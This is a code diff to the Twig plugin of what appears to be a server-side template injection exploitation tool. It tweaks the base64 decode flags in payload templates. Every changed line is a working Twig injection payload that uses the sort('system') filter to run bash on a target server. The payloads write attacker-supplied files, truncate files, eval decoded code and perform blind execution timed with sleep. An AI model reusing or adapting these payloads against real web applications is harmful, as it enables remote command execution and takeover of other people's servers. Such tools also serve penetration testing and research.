@@ -21,7 +21,7 @@ class Twig(php.Php):
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}'", ""]|sort("system") }}}}""",
+                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'", ""]|sort("system") }}}}""",
                 'truncate': """{{{{ ["echo -n >{path}", ""]|sort("system") }}}}"""
             },
             # Hackish way to evaluate PHP code
@@ -33,13 +33,13 @@ class Twig(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{% set foo=[] %}}{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
+                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'", ""]|sort("system") %}}{{% endfor %}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
+                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'", ""]|sort("system") }}}}"""
             },
             'evaluate_blind': {
                 'call': 'execute',
